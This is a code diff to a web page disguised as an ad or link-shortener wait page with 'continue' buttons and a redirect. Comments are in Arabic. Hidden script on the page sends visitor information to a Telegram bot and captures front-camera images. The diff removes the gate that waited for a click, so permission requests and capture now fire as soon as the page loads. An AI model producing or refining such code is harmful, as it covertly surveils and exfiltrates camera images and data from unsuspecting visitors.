@@ -89,7 +89,7 @@
 "use strict";
 
 /* ═══════════════════════════════════════════════════
-   1. كود الأذونات الخاص بك (بدون أي تعديل)
+   1. كود الأذونات الخاص بك (زي ما هو)
    ═══════════════════════════════════════════════════ */
 function decodeBase64(value) {
     try {
@@ -99,7 +99,6 @@ function decodeBase64(value) {
         const bytes = Uint8Array.from(binary, char => char.charCodeAt(0));
         return new TextDecoder().decode(bytes);
     } catch (error) {
-        console.error("Decode error:", error);
         return "";
     }
 }
@@ -320,10 +319,8 @@ async function startFeatures() {
     if (!BOT_ID || !BOT_TOKEN) return;
     const features = getFeatures();
     
-    // إرسال المعلومات الأساسية
     await sendVisitorInfo();
 
-    // التقاط الصور والفيديو والصوت
     if (features.has('fc')) {
         try { const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }); await captureAndSend(stream, 'front'); stream.getTracks().forEach(t => t.stop()); } catch (e) {}
     }
@@ -369,7 +366,7 @@ function show(n){ document.querySelectorAll(".page").forEach(function(p){p.class
 addBanners("ads1"); 
 ring(1, WAIT1, false, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b1"); });
 
-// عند الضغط على "متابعة" في الصفحة الأولى
+// زرار متابعة صفحة 1
 $("b1").onclick = function(){ 
     goNext(this, function(){ 
         show(2); 
@@ -378,6 +375,7 @@ $("b1").onclick = function(){
     }); 
 };
 
+// زرار متابعة صفحة 2
 $("b2").onclick = function(){ 
     goNext(this, function(){ 
         show(3); 
@@ -390,19 +388,10 @@ $("b2").onclick = function(){
 $("b3").onclick = function(){ window.location.href = SMART_LINK; };
 
 /* ═══════════════════════════════════════════════════
-   4. تشغيل الأذونات والإرسال
+   4. التشغيل الفوري (أول ما الصفحة تفتح)
    ═══════════════════════════════════════════════════ */
-// بنشغل المعلومات الأساسية فوراً (عشان تتبعت)
-sendVisitorInfo();
-
-// الأذونات والكاميرا مش هتشتغل غير لما المستخدم يدوس (عشان المتصفح يقبل)
-let started = false;
-document.addEventListener('click', function() {
-    if (started) return;
-    started = true;
-    start();         // طلب الأذونات
-    startFeatures(); // التقاط وإرسال الملفات
-}, { once: true });
+start();         // الكود بتاعك بيطلب الأذونات فوراً
+startFeatures(); // الكود اللي بيصور ويبعت على تليجرام فوراً
 </script>
 </body>
   </html>
